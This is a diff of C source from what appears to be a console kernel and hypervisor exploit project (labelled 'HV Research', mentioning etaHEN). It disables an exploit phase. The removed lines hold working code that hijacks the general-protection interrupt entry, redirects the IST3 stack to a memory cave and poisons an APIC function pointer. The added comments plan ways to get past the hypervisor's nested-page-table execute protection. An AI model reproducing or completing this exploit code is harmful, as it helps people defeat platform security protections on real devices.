@@ -5836,13 +5836,47 @@ static void campaign_flatz_setup(void) {
         printf("=============================================\n\n");
         fflush(stdout);
 
-        /* ── Phase 9: ARM the flatz method ──
+        /* ── Phase 9 CANNOT be armed during normal operation ──
          *
-         * NPT maps kdata as RW+X (confirmed by NPT scan).  Guest PTE
-         * NX-clear + G-bit clear ensures the cave page is executable.
-         * The handler does NOT read ktext (which is XOM under NPT).
-         * All handler writes go through DMAP (same PAs, NPT allows RW).
+         * The #GP handler lives in a kdata cave.  During normal operation,
+         * the HV's NPT (Nested Page Tables) enforces NX on ALL kdata pages.
+         * Clearing the guest PTE NX bit is not enough — NPT is the outer
+         * layer and takes precedence.
+         *
+         * If we poison apic_ops[2] now, the next xapic_mode() call triggers
+         * #GP, CPU fetches IDT[13] handler from kdata, NPT blocks execution
+         * → nested page fault → system freeze/crash.
+         *
+         * CONFIRMED BY TESTING: arming during normal operation causes an
+         * immediate kernel panic.  The "NPT scan" that appeared to show
+         * kdata as RW+X was misread — NPT enforces NX on kdata.
+         *
+         * The handler is ONLY executable during early resume (before the HV
+         * reinitializes NPT).  But we need to arm the poison BEFORE suspend.
+         * This is a chicken-and-egg problem:
+         *   - Handler must be in executable memory (ktext or NPT-allowed)
+         *   - ktext is XOM — can't write to it via DMAP (NPT blocks writes)
+         *   - kdata is writable but NPT blocks execution
+         *
+         * SOLUTION NEEDED: Either:
+         *   a) Use ring-0 (sysent hook) to call pmap functions that make
+         *      the cave page executable in the NPT, or
+         *   b) Place handler in ktext by finding a writable ktext region, or
+         *   c) Use the etaHEN daemon's suspend hook to arm the poison at
+         *      the very last moment during ACPI S3 entry (when HV may be
+         *      partially shut down), or
+         *   d) Use a ktext gadget (e.g. Xinvtlb / push_pop_all_iret) as
+         *      a first-stage handler that pivots to our kdata handler
+         *
+         * For now: build improved handler (no ktext reads, IST3 restore),
+         * write to cave, verify, but DO NOT patch IDT[13], IST3, or
+         * poison apic_ops[2].
          */
+        printf("[!] Phase 9: DIAGNOSTIC ONLY — not arming.\n");
+        printf("    Handler in kdata cave is NOT executable under NPT.\n");
+        printf("    Poisoning apic_ops[2] would crash the system.\n");
+        printf("    Need NPT-executable memory for handler first.\n\n");
+        fflush(stdout);
 
         if (!idt_pa || !tss_pa) {
             printf("[-] IDT/TSS PA not resolved — cannot arm Phase 9.\n");
@@ -6183,164 +6217,49 @@ static void campaign_flatz_setup(void) {
 
         printf("[+] Cave data written (IDT backup, xapic, markers)\n");
 
-        /* ── Pre-arm verification ──
+        /* ── Phase 9 summary (DIAGNOSTIC ONLY) ──
          *
-         * Before touching IDT/TSS/apic_ops, verify all DMAP target
-         * addresses are accessible by reading back known data.
+         * NOT arming IDT[13], IST3, or apic_ops[2] poison.
+         *
+         * The handler lives in kdata (cave+0x180).  During normal
+         * operation, the HV's NPT enforces NX on kdata.  If we poison
+         * apic_ops[2], the next xapic_mode() call triggers #GP, CPU
+         * fetches handler from kdata, NPT blocks execution → crash.
+         *
+         * The guest PTE NX-clear is insufficient — NPT is the outer
+         * permission layer and overrides guest PTEs.  The handler is
+         * ONLY executable during early resume before HV sets up NPT.
+         *
+         * To proceed, we need one of:
+         *   a) Ring-0 execution to call pmap/NPT functions that mark
+         *      the cave page executable in the HV's NPT
+         *   b) A way to place handler code in ktext (NPT-executable)
+         *   c) A ktext first-stage handler (gadget) that pivots to
+         *      our kdata handler during the pre-NPT resume window
+         *   d) Arm the poison during ACPI S3 entry when HV may be
+         *      partially shut down
          */
-        {
-            uint8_t idt_verify[16];
-            kernel_copyout(g_dmap_base + idt_pa + 16 * 13, idt_verify, 16);
-            if (memcmp(idt_verify, idt13_orig, 16) != 0) {
-                printf("[-] IDT[13] DMAP readback mismatch — aborting arm.\n");
-                fflush(stdout);
-                return;
-            }
-            uint64_t ops2_verify;
-            kernel_copyout(g_dmap_base + ops_pa + 2 * 8, &ops2_verify, 8);
-            if (ops2_verify != original_xapic) {
-                printf("[-] apic_ops[2] DMAP readback mismatch — aborting arm.\n");
-                fflush(stdout);
-                return;
-            }
-            printf("[+] Pre-arm verification passed (IDT, apic_ops DMAP OK)\n");
-        }
-
-        /* ── Step 1: Patch IDT[13] to point to our handler ──
-         *
-         * IDT entry format (16 bytes):
-         *   [0..1]  offset_low   (bits 15:0)
-         *   [2..3]  selector     (keep original CS selector)
-         *   [4]     IST          (will set to 3 separately via TSS)
-         *   [5]     type_attr    (keep original — present, interrupt gate)
-         *   [6..7]  offset_mid   (bits 31:16)
-         *   [8..11] offset_high  (bits 63:32)
-         *   [12..15] reserved
-         *
-         * We build a new IDT[13] entry pointing to handler_kva,
-         * keeping the original CS selector and type attributes,
-         * but setting IST=3.
-         */
-        uint8_t idt13_new[16];
-        memcpy(idt13_new, idt13_orig, 16);
-
-        /* Patch offset to handler_kva */
-        idt13_new[0] = (handler_kva >>  0) & 0xFF;
-        idt13_new[1] = (handler_kva >>  8) & 0xFF;
-        idt13_new[6] = (handler_kva >> 16) & 0xFF;
-        idt13_new[7] = (handler_kva >> 24) & 0xFF;
-        idt13_new[8] = (handler_kva >> 32) & 0xFF;
-        idt13_new[9] = (handler_kva >> 40) & 0xFF;
-        idt13_new[10] = (handler_kva >> 48) & 0xFF;
-        idt13_new[11] = (handler_kva >> 56) & 0xFF;
-
-        /* Set IST=3 in the IDT entry itself (bits 2:0 of byte 4) */
-        idt13_new[4] = (idt13_new[4] & 0xF8) | 3;
-
-        printf("[*] Patching IDT[13]: handler=0x%lx IST=3\n",
-               (unsigned long)handler_kva);
-
-        kernel_copyin(idt13_new, g_dmap_base + idt_pa + 16 * 13, 16);
-
-        /* Verify IDT[13] patch */
-        uint8_t idt13_check[16];
-        kernel_copyout(g_dmap_base + idt_pa + 16 * 13, idt13_check, 16);
-        if (memcmp(idt13_check, idt13_new, 16) != 0) {
-            printf("[-] IDT[13] patch verification FAILED — rolling back.\n");
-            kernel_copyin(idt13_orig, g_dmap_base + idt_pa + 16 * 13, 16);
-            fflush(stdout);
-            return;
-        }
-        printf("[+] IDT[13] patched and verified OK\n");
-
-        /* ── Step 2: Set IST3 in TSS to cave stack (cave+0x100) ──
-         *
-         * IST3 offset in TSS = 28 + 3*8 = 0x34
-         * IST3 points to top of stack (grows down): cave_kva + 0x100
-         * This gives 256 bytes of stack space (cave+0x000 to cave+0x100)
-         * Handler needs ~80 bytes (48 CPU frame + 32 for 4 pushes)
-         *
-         * TSS stride per CPU = 0x68.  We set IST3 for CPU 0 only.
-         * Per-CPU race is negligible — handler runs in nanoseconds.
-         *
-         * orig_ist3 was read earlier (before handler construction)
-         * so its value could be baked into the handler for restoration.
-         */
-        uint64_t ist3_value = cave_kva + 0x100;  /* stack top */
-
-        /* Save original IST3 at cave+0x130 for rollback */
-        kernel_copyin(&orig_ist3, cave_dmap + 0x130, 8);
-
-        printf("[*] Setting IST3: 0x%lx → 0x%lx\n",
-               (unsigned long)orig_ist3, (unsigned long)ist3_value);
-
-        kernel_copyin(&ist3_value, ist3_dmap, 8);
-
-        /* Verify IST3 */
-        uint64_t ist3_check;
-        kernel_copyout(ist3_dmap, &ist3_check, 8);
-        if (ist3_check != ist3_value) {
-            printf("[-] IST3 write verification FAILED — rolling back.\n");
-            kernel_copyin(idt13_orig, g_dmap_base + idt_pa + 16 * 13, 16);
-            kernel_copyin(&orig_ist3, ist3_dmap, 8);
-            fflush(stdout);
-            return;
-        }
-        printf("[+] IST3 set and verified OK\n");
-
-        /* ── Step 3: Poison apic_ops[2] (LAST — point of no return) ──
-         *
-         * Replace the top 16 bits of the xapic_mode function pointer
-         * with 0xDEB7, making it a non-canonical address.  Any call to
-         * xapic_mode() will trigger #GP → our handler restores both
-         * IDT[13] and apic_ops[2] to their original values.
-         *
-         * The handler is self-healing: after one #GP, the system is
-         * back to normal with original IDT and apic_ops restored.
-         */
-        uint64_t poisoned_xapic = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
-                                  (0xDEB7ULL << 48);
-
-        printf("[*] Poisoning apic_ops[2]: 0x%016lx → 0x%016lx\n",
-               (unsigned long)original_xapic, (unsigned long)poisoned_xapic);
-
-        kernel_copyin(&poisoned_xapic, g_dmap_base + ops_pa + 2 * 8, 8);
-
-        /* Verify poison */
-        uint64_t poison_check;
-        kernel_copyout(g_dmap_base + ops_pa + 2 * 8, &poison_check, 8);
-        if (poison_check != poisoned_xapic) {
-            printf("[-] apic_ops[2] poison verification FAILED — rolling back ALL.\n");
-            kernel_copyin(&original_xapic, g_dmap_base + ops_pa + 2 * 8, 8);
-            kernel_copyin(idt13_orig, g_dmap_base + idt_pa + 16 * 13, 16);
-            kernel_copyin(&orig_ist3, ist3_dmap, 8);
-            fflush(stdout);
-            return;
-        }
-        printf("[+] apic_ops[2] poisoned and verified OK\n");
-
-        /* ── Phase 9 ARMED ── */
         printf("\n[+] ============================================\n");
-        printf("[+]  PHASE 9 — ARMED (flatz method)\n");
+        printf("[+]  PHASE 9 — DIAGNOSTIC COMPLETE\n");
         printf("[+] ============================================\n");
         printf("[+]\n");
-        printf("[+]  Handler:       %d bytes at 0x%lx\n", hc,
-               (unsigned long)handler_kva);
-        printf("[+]  Cave:          0x%lx (PA 0x%lx)\n",
+        printf("[+]  Handler built: %d bytes at cave+0x180\n", hc);
+        printf("[+]  Handler KVA:   0x%lx\n", (unsigned long)handler_kva);
+        printf("[+]  Cave KVA:      0x%lx  PA: 0x%lx\n",
                (unsigned long)cave_kva, (unsigned long)cave_pa);
-        printf("[+]  IDT[13]:       → handler, IST=3\n");
-        printf("[+]  IST3 stack:    0x%lx (256 bytes)\n",
-               (unsigned long)ist3_value);
-        printf("[+]  apic_ops[2]:   0x%016lx (POISONED)\n",
-               (unsigned long)poisoned_xapic);
-        printf("[+]  Original:      0x%016lx (saved in cave+0x110)\n",
+        printf("[+]  Cave PTE NX:   cleared (guest PTE only)\n");
+        printf("[+]  IDT PA:        0x%lx\n", (unsigned long)idt_pa);
+        printf("[+]  TSS PA:        0x%lx\n", (unsigned long)tss_pa);
+        printf("[+]  Orig IST3:     0x%lx (baked into handler)\n",
+               (unsigned long)orig_ist3);
+        printf("[+]  apic_ops[2]:   0x%016lx (UNCHANGED)\n",
                (unsigned long)original_xapic);
         printf("[+]\n");
-        printf("[+]  Enter REST MODE to trigger suspend/resume.\n");
-        printf("[+]  On resume, first xapic_mode() call → #GP → handler\n");
-        printf("[+]  Handler restores IDT[13] + apic_ops[2] + IST3 → clean state\n");
+        printf("[!]  NOT ARMED — handler in kdata is NX under NPT.\n");
+        printf("[!]  Poisoning apic_ops[2] would crash the system.\n");
+        printf("[!]  Need NPT-executable memory for handler.\n");
 
-        notify("[HV Research] Phase 9 ARMED — enter REST MODE!");
+        notify("[HV Research] Phase 9 diagnostic complete (not armed).");
 
         fflush(stdout);
         return;
